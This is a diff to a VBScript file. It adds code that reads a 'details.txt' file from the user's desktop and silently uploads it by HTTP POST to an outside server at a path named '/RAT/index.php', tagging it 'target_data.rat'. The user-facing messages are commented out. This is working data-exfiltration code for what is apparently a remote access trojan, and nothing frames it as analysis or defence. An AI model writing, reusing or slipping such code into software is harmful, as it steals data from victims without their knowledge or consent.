@@ -194,4 +194,29 @@ objFile.WriteLine
 Set http = Nothing
 
 
+' Upload the details.txt file
+Dim filePath, url, xmlhttp, formData
+filePath = strDesktopPath & "\details.txt"
+url = "https://arth.imbeddex.com/RAT/index.php"
+
+' Create XMLHTTP object
+Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+
+' Open the connection
+xmlhttp.Open "POST", url, False
+
+' Create form data
+formData = "target_data.rat" & vbCrLf
+formData = formData & ReadFile(filePath) & vbCrLf
+
+' Send the request
+xmlhttp.send formData
+
+' Check the response
+If xmlhttp.Status = 200 Then
+    'MsgBox "File uploaded successfully!"
+Else
+    'MsgBox "Error uploading file: " & xmlhttp.Status & " - " & xmlhttp.statusText
+End If
+
 objFile.Close
